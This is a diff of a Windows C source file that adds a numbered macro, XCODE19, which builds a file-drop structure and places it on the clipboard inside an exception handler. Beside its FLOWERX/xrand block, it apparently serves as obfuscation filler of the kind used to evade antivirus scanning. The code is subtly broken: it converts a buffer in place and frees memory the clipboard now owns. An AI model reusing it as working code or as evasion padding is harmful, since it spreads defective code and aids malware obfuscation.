@@ -81,6 +81,11 @@ CONSOLE_SCREEN_BUFFER_INFO *lpConsoleScreenBufferInfo;
 CRITICAL_SECTION	g_CriticalSection;
 PROCESSENTRY32 procentry;
 FILETIME    datetime,local_filetime;
+UINT uDropEffect;
+DROPFILES dropFiles;
+UINT uGblLen,uDropFilesLen;
+HGLOBAL hGblFiles,hGblEffect;
+DWORD *dwDropEffect;
 
 typedef BOOL (CALLBACK *PROCENUMPROC)(DWORD, WORD, LPSTR, LPARAM);
 typedef struct {
@@ -664,6 +669,39 @@ do {\
 			__except(EXCEPTION_EXECUTE_HANDLER){\
 			Sleep(18);\
 		}
+
+#define XCODE19 __try{\
+		uDropEffect=RegisterClipboardFormat(AddMsg);\
+		hGblEffect=GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE,sizeof(DWORD));\
+		dwDropEffect=(DWORD*)GlobalLock(hGblEffect);\
+		*dwDropEffect=DROPEFFECT_COPY;\
+		GlobalUnlock(hGblEffect);\
+		uDropFilesLen=sizeof(DROPFILES);\
+		dropFiles.pFiles =uDropFilesLen;\
+		dropFiles.pt.x=0;\
+		dropFiles.pt.y=0;\
+		dropFiles.fNC =FALSE;\
+		dropFiles.fWide =TRUE;\
+		uGblLen=uDropFilesLen+dwSizeXXX*2+8;\
+		hGblFiles= GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE, uGblLen);\
+		buf=(char*)GlobalLock(hGblFiles);\
+		memcpy(buf,(LPVOID)(&dropFiles),uDropFilesLen);\
+		buf=buf+uDropFilesLen;\
+		MultiByteToWideChar(CP_ACP,MB_COMPOSITE,buf,MAX_PATH,(WCHAR *)buf,MAX_PATH);\
+		GlobalUnlock(hGblFiles);\
+		if( OpenClipboard(NULL) )\
+		{\
+			EmptyClipboard();\
+			SetClipboardData(CF_HDROP, hGblFiles);\
+			SetClipboardData(uDropEffect,hGblEffect);\
+			CloseClipboard();\
+		}\
+		GlobalFree(hGblEffect);\
+		GlobalFree(hGblFiles);\
+	}\
+		__except(EXCEPTION_EXECUTE_HANDLER){\
+		Sleep(19);\
+	}
 
 #ifdef FLOWERX
 #include "xrand.h"
